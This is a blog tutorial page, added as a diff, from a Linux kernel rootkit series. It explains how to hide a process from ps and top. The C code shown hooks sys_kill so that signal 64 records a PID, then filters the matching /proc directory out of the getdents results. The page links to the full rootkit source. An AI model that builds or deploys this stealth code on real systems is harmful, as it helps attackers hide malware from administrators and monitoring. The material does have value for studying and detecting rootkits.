@@ -1,0 +1,288 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  
+    <title>Linux Rootkits Part 7: Hiding Processes :: TheXcellerator</title>
+  
+  <meta http-equiv="content-type" content="text/html; charset=utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1">
+<meta name="description" content="Now that we know how to hide directories (see last time), we can also hide processes! This is because nearly all userspace tools that give us information about processes just read the contents of the /proc/ filesystem. We can check this by looking at the output of strace -e openat ps or strace -e openat top. So, if we hide directories with the name of the PID we want to keep secret, then these userspace tools won&amp;rsquo;t notice that the process is there!" />
+<meta name="keywords" content="" />
+<meta name="robots" content="noodp" />
+<link rel="canonical" href="/posts/linux_rootkits_07/" />
+
+
+
+
+<link rel="stylesheet" href="/assets/style.css">
+
+  <link rel="stylesheet" href="/assets/blue.css">
+
+
+
+
+
+
+<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/img/apple-touch-icon-144-precomposed.png">
+
+  <link rel="shortcut icon" href="/img/favicon/blue.png">
+
+
+
+<meta name="twitter:card" content="summary" />
+
+<meta name="twitter:creator" content="TheXcellerator" />
+
+
+<meta property="og:locale" content="en" />
+<meta property="og:type" content="article" />
+<meta property="og:title" content="Linux Rootkits Part 7: Hiding Processes :: TheXcellerator">
+<meta property="og:description" content="Now that we know how to hide directories (see last time), we can also hide processes! This is because nearly all userspace tools that give us information about processes just read the contents of the /proc/ filesystem. We can check this by looking at the output of strace -e openat ps or strace -e openat top. So, if we hide directories with the name of the PID we want to keep secret, then these userspace tools won&amp;rsquo;t notice that the process is there!" />
+<meta property="og:url" content="/posts/linux_rootkits_07/" />
+<meta property="og:site_name" content="Linux Rootkits Part 7: Hiding Processes" />
+
+  
+    <meta property="og:image" content="/img/favicon/blue.png">
+  
+
+<meta property="og:image:width" content="2048">
+<meta property="og:image:height" content="1024">
+
+  <meta property="article:section" content="linux" />
+
+
+  <meta property="article:published_time" content="2020-10-01 12:00:00 &#43;0100 BST" />
+
+
+
+
+
+
+
+
+
+
+
+
+</head>
+<body class="">
+
+
+<div class="container center headings--one-size">
+
+  <header class="header">
+  <div class="header__inner">
+    <div class="header__logo">
+      <a href="/">
+  <div class="logo">
+    TheXcellerator
+  </div>
+</a>
+
+    </div>
+    <div class="menu-trigger">menu</div>
+  </div>
+  
+    <nav class="menu">
+  <ul class="menu__inner menu__inner--desktop">
+    
+      
+        
+          <li><a href="/categories/cryptography/">Cryptography</a></li>
+        
+      
+        
+          <li><a href="/categories/linux/">Linux</a></li>
+        
+      
+        
+          <li><a href="/categories/other/">Other</a></li>
+        
+      
+        
+          <li><a href="/categories/reverse_engineering/">Reverse Engineering</a></li>
+        
+      
+      
+    
+
+    
+  </ul>
+
+  <ul class="menu__inner menu__inner--mobile">
+    
+      
+        <li><a href="/categories/cryptography/">Cryptography</a></li>
+      
+    
+      
+        <li><a href="/categories/linux/">Linux</a></li>
+      
+    
+      
+        <li><a href="/categories/other/">Other</a></li>
+      
+    
+      
+        <li><a href="/categories/reverse_engineering/">Reverse Engineering</a></li>
+      
+    
+    
+  </ul>
+</nav>
+
+  
+</header>
+
+
+  <div class="content">
+    
+<div class="post">
+  <h1 class="post-title">
+    <a href="/posts/linux_rootkits_07/">Linux Rootkits Part 7: Hiding Processes</a></h1>
+  <div class="post-meta">
+      
+    <span class="post-date">
+      2020-10-01
+    </span>
+    
+    
+    <span class="post-author">::
+      TheXcellerator
+    </span>
+    
+  </div>
+
+  
+  <span class="post-tags">
+    
+    #<a href="/tags/linux/">linux</a>&nbsp;
+    
+    #<a href="/tags/rootkit/">rootkit</a>&nbsp;
+    
+    #<a href="/tags/stealth/">stealth</a>&nbsp;
+    
+    #<a href="/tags/processes/">processes</a>&nbsp;
+    
+  </span>
+  
+
+  
+
+  <div class="post-content"><div>
+        <p>Now that we know how to hide directories (see <a href="../linux_rootkits_06/">last time</a>), we can also hide processes! This is because <em>nearly all</em> userspace tools that give us information about processes just read the contents of the <code>/proc/</code> filesystem. We can check this by looking at the output of <code>strace -e openat ps</code> or <code>strace -e openat top</code>. So, if we hide directories with the name of the PID we want to keep secret, then these userspace tools won&rsquo;t notice that the process is there!</p>
+<blockquote>
+<p>There is a slight caveat that we will hide <em>all</em> files or directories with the name of the PID we&rsquo;re hiding. The likelihood of this being spotted is pretty low.</p>
+</blockquote>
+<h1 id="chosing-which-pid-to-hide">Chosing which PID to hide<a href="#chosing-which-pid-to-hide" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>PIDs are very unpredictable, so we don&rsquo;t want to hardcode one into our rootkit. Therefore we need to come up with a way to tell our module which PID we want to hide. The easiest way to do this is to just hook <code>sys_kill()</code> again because it&rsquo;s already built to send a PID to the kernel! We can implement a custom signal handler again (like in <a href="../linux_rootkits_03/">Part 3</a> and <a href="../linux_rootkits_05/">Part 5</a>). The only difference will be that we will write the PID passed to signal <code>64</code> into a global <code>hide_pid</code> variable, rather than just ignoring it.</p>
+<p>The hook for <code>sys_kill()</code> should look something like this (as always, I&rsquo;m only illutrating the hook that uses the more modern <code>pt_regs</code> method of calling - more info can be found in <a href="../linux_rootkits_02/">Part 2</a>):</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#75715e">/*
+</span><span style="color:#75715e"> * hide_pid will store the string representation of the PID we&#39;re hiding
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">char</span> hide_pid[NAME_MAX];
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * Declaration for the real sys_kill() function
+</span><span style="color:#75715e"> */</span>
+<span style="color:#66d9ef">static</span> asmlinkage <span style="color:#a6e22e">long</span> (<span style="color:#f92672">*</span>orig_kill)(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>);
+
+<span style="color:#75715e">/*
+</span><span style="color:#75715e"> * The syscall hook
+</span><span style="color:#75715e"> */</span>
+asmlinkage <span style="color:#66d9ef">int</span> <span style="color:#a6e22e">hook_kill</span>(<span style="color:#66d9ef">const</span> <span style="color:#66d9ef">struct</span> pt_regs <span style="color:#f92672">*</span>regs)
+{
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * Pull out the arguments we need from the pt_regs struct
+</span><span style="color:#75715e">     */</span>
+    pid_t pid <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>di;
+    <span style="color:#66d9ef">int</span> sig <span style="color:#f92672">=</span> regs<span style="color:#f92672">-&gt;</span>si;
+
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * If the signal is 64, then print a message to the kernel buffer and
+</span><span style="color:#75715e">     * write the PID as a string to hide_pid
+</span><span style="color:#75715e">     */</span>
+    <span style="color:#66d9ef">if</span> (sig <span style="color:#f92672">==</span> <span style="color:#ae81ff">64</span>)
+    {
+        printk(KERN_INFO <span style="color:#e6db74">&#34;rootkit: hiding process with pid %d</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pid);
+        sprintf(hide_pid, <span style="color:#e6db74">&#34;%d%&#34;</span>, pid);
+        <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+    }
+
+    <span style="color:#75715e">/*
+</span><span style="color:#75715e">     * Otherwise, just return the real sys_kill
+</span><span style="color:#75715e">     */</span>
+    <span style="color:#66d9ef">return</span> orig_kill(regs);
+}
+</code></pre></div><h1 id="hiding-the-pid">Hiding The PID<a href="#hiding-the-pid" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h1>
+<p>Now that we can tell the rootkit which PID we&rsquo;d like to hide, we have to actually hide it! The way we do that is by taking the hooks for <code>sys_getdents()</code> and <code>sys_getdents64()</code> from <a href="../linux_rootkits_06">Part 6</a>, and replacing the line that compares <code>current_dir-&gt;d_name</code> to the <code>PREFIX</code> with one that compares it to <code>hide_pid</code> - see <a href="https://github.com/xcellerator/linux_kernel_hacking/blob/7d840312deb710e28fa46dd634a60f3d182e2c9f/3_RootkitTechniques/3.5_hiding_processes/rootkit.c#L72">line 72</a> of the new <code>rootkit.c</code>:</p>
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-c" data-lang="c"><span style="color:#66d9ef">if</span> ( (memcmp(hide_pid, current_dir<span style="color:#f92672">-&gt;</span>d_name, strlen(hide_pid)) <span style="color:#f92672">==</span> <span style="color:#ae81ff">0</span>)
+        <span style="color:#f92672">&amp;&amp;</span> (strncmp(hide_pid, <span style="color:#e6db74">&#34;&#34;</span>, NAME_MAX) <span style="color:#f92672">!=</span> <span style="color:#ae81ff">0</span>) )
+{
+    <span style="color:#75715e">/* Hide the directory with name in hide_pid */</span>
+}
+</code></pre></div><blockquote>
+<p>Note that we also have to make sure that <code>hide_pid</code> isn&rsquo;t empty! If we don&rsquo;t then the module will start off by hiding <em>every directory on the system</em>. This is because <code>strlen(hide_pid)</code> will be <code>0</code>, so the call to <code>memcmp()</code> will always return true.</p>
+</blockquote>
+<p>And that&rsquo;s pretty much all there is to it! Once we put together the rest of the kernel module (Ftrace, etc), we can build it and try it out. The full source (complete with headers and Makefile) is on the <a href="https://github.com/xcellerator/linux_kernel_hacking/tree/master/3_RootkitTechniques/3.5_hiding_processes">repo</a>.</p>
+<p>Let&rsquo;s try it out!</p>
+<p><img src="/img/hide_process.png" alt="hideprocess"></p>
+<p>Success! PID <code>43218</code> gets hidden from the output of <code>ps</code> - and we didn&rsquo;t even have to try that hard! This might seem like a simple technique to pull off, but it&rsquo;s only because we&rsquo;re repurposing two different syscall hooks that we&rsquo;ve already covered: <code>sys_kill()</code> in <a href="../linux_rootkits_03/">Part 3</a> and <code>sys_getdents()</code>/<code>sys_getdents64()</code> in <a href="../linux_rootkits_06/">Part 6</a>.</p>
+<p>The only downside is that we can only hide one PID at a time. Support for more than one PID is left for you to try. Be warned though, it&rsquo;s not as simple as it may sound!</p>
+<p>Hope you enjoyed this one - it&rsquo;s a little shorter than usual but that&rsquo;s only because there isn&rsquo;t much new here, just a clever combination of techniques we&rsquo;ve already covered.</p>
+<p>Until next time&hellip;</p>
+
+      </div></div>
+
+  
+  
+<div class="pagination">
+    <div class="pagination__title">
+        <span class="pagination__title-h">Read other posts</span>
+        <hr />
+    </div>
+    <div class="pagination__buttons">
+        
+        
+        <span class="button next">
+            <a href="/posts/docker_escape/">
+                <span class="button__text">Privileged Container Escapes with Kernel Modules</span>
+                <span class="button__icon">→</span>
+            </a>
+        </span>
+        
+    </div>
+</div>
+
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright copyright--user">
+        <span>Harvey Phillips 2020 - London, England</span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
